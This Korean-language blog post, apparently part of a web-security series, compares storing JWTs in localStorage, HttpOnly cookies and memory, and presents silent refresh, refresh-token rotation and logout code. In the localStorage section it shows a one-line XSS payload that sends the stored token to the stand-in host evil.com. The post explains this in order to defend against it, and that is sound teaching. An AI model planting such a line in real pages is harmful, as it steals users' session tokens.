---
title: "JWT 저장 전략 — localStorage vs HttpOnly 쿠키"
description: "JWT를 localStorage·sessionStorage·HttpOnly 쿠키·인메모리에 저장할 때의 XSS·CSRF 위험도 비교, Refresh Token 회전과 Silent Refresh 패턴, 토큰 탈취 대응 전략을 정리합니다."
author: "PALDYN Team"
pubDate: "2026-05-22"
archiveOrder: 7
type: "knowledge"
category: "JavaScript"
tags: ["JavaScript", "보안", "JWT", "localStorage", "HttpOnly", "RefreshToken", "SilentRefresh", "인증"]
featured: false
draft: false
---

[지난 글](/posts/sec-cookies-httponly-secure/)에서 쿠키의 보안 속성을 살펴봤습니다. 이번에는 실제 프로젝트에서 가장 많이 묻는 질문 중 하나인 **"JWT를 어디에 저장해야 하는가"** 를 공격 벡터와 방어 전략을 중심으로 분석합니다.

## 선택지가 왜 중요한가

JWT는 서명이 검증된 상태변화 없는 인증 토큰입니다. 탈취되면 만료 전까지 공격자가 그 토큰으로 모든 API를 호출할 수 있습니다. 저장 위치에 따라 **XSS에 취약**하거나 **CSRF에 취약**하거나 둘 다 방어가 됩니다. 완벽한 선택지는 없고, 트레이드오프를 이해하고 완화 방법을 적용하는 것이 핵심입니다.

## 저장 위치별 보안 비교

![JWT 저장 위치별 보안 비교](/assets/posts/sec-jwt-storage-compare.svg)

### localStorage — XSS에 취약

`localStorage`는 JavaScript로 자유롭게 읽고 쓸 수 있어 편리하지만, XSS가 발생하면 공격자가 즉시 토큰을 탈취할 수 있습니다.

```js
// XSS 공격 페이로드 한 줄로 탈취
fetch(`https://evil.com?token=${localStorage.getItem('jwt')}`);
```

CSRF는 걱정할 필요가 없습니다. `localStorage` 값은 `Authorization` 헤더에 수동으로 넣어야 하고, 브라우저가 자동으로 헤더를 첨부하지 않기 때문입니다.

**결론**: XSS 가능성이 없다고 확신하는 내부 도구·관리자 패널 또는 만료 시간이 매우 짧은 토큰에만 사용합니다.

### HttpOnly 쿠키 — CSRF 방어 필요

`HttpOnly` 쿠키는 JavaScript가 읽을 수 없어 XSS로부터 안전합니다. 단, 브라우저가 자동으로 포함하므로 CSRF에 취약합니다. `SameSite=Strict`와 CSRF 토큰으로 방어합니다.

```http
Set-Cookie: refreshToken=xyz; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
```

`Path=/auth/refresh`로 제한하면 리프레시 엔드포인트 외 요청에는 쿠키가 첨부되지 않아 노출 범위를 최소화할 수 있습니다.

### 인메모리(변수) — 가장 안전

모듈 스코프 변수에 저장하면 XSS로 읽을 수 없고(평범한 코드로 접근 불가), CSRF도 걱정 없습니다. 단, 페이지 새로고침 시 토큰이 사라집니다.

```js
// auth.js — 모듈 스코프로 격리
let accessToken = null;

export function setAccessToken(token) {
  accessToken = token;
}
export function getAccessToken() {
  return accessToken;
}
```

## 권장 패턴: Silent Refresh

![Silent Refresh 패턴](/assets/posts/sec-jwt-storage-flow.svg)

업계 모범 사례는 두 종류의 토큰을 분리 저장하는 방식입니다.

| 토큰 | 만료 | 저장 위치 | 역할 |
|---|---|---|---|
| **Access Token** | 5~15분 (짧게) | 메모리(변수) | API 호출 |
| **Refresh Token** | 7~30일 | `HttpOnly` 쿠키 | Access Token 재발급 |

```js
// fetch 인터셉터로 401 처리 — Silent Refresh
async function fetchWithAuth(url, options = {}) {
  let res = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${getAccessToken()}`,
    },
  });

  if (res.status === 401) {
    // Refresh Token(쿠키)으로 새 Access Token 요청
    const refreshRes = await fetch('/auth/refresh', {
      method: 'POST',
      credentials: 'include',   // 쿠키 포함
    });

    if (!refreshRes.ok) {
      // Refresh Token도 만료 → 로그아웃
      logout();
      throw new Error('Session expired');
    }

    const { accessToken } = await refreshRes.json();
    setAccessToken(accessToken);

    // 원래 요청 재시도
    res = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${accessToken}`,
      },
    });
  }

  return res;
}
```

## Refresh Token 회전 (Rotation)

Refresh Token이 한 번 사용되면 새 Refresh Token을 발급하고 기존 것을 무효화하는 전략입니다. 탈취된 Refresh Token이 사용되면 서버가 탐지할 수 있습니다.

```js
// 서버 측 — Refresh Token 회전
app.post('/auth/refresh', async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;
  const payload = verifyRefreshToken(oldRefreshToken);

  // 이미 사용된 토큰이면 모든 세션 무효화 (탈취 탐지)
  if (await isTokenRevoked(oldRefreshToken)) {
    await revokeAllUserTokens(payload.userId);
    return res.status(401).json({ error: 'Token reuse detected' });
  }

  await revokeToken(oldRefreshToken);

  const newAccessToken = signAccessToken(payload.userId);
  const newRefreshToken = signRefreshToken(payload.userId);

  res.cookie('refreshToken', newRefreshToken, {
    httpOnly: true, secure: true, sameSite: 'strict',
    path: '/auth/refresh',
  });
  res.json({ accessToken: newAccessToken });
});
```

## 로그아웃 처리

토큰 기반 인증에서 완전한 로그아웃은 서버 측 블랙리스트나 Refresh Token 무효화가 필요합니다.

```js
// 로그아웃
app.post('/auth/logout', requireAuth, async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  if (refreshToken) await revokeToken(refreshToken);

  res.clearCookie('refreshToken', {
    path: '/auth/refresh', secure: true, sameSite: 'strict',
  });
  res.status(204).end();
});
```

클라이언트는 로그아웃 요청 후 메모리의 Access Token도 지웁니다.

## 정리

`localStorage`는 편리하지만 XSS가 발생하면 토큰이 즉시 탈취됩니다. 인증 토큰의 최선 저장 방식은 **Refresh Token을 HttpOnly+Secure+SameSite=Strict 쿠키에, Access Token을 인메모리에 저장하는 Silent Refresh 패턴**입니다. 다음 글에서는 OAuth 클라이언트 흐름을 정리합니다.

---

**지난 글:** [쿠키 보안 — HttpOnly·Secure·SameSite·__Host 접두사](/posts/sec-cookies-httponly-secure/)

**다음 글:** [OAuth 2.0 클라이언트 흐름 — PKCE와 Authorization Code](/posts/sec-oauth-client-flows/)

<br>
읽어주셔서 감사합니다. 😊
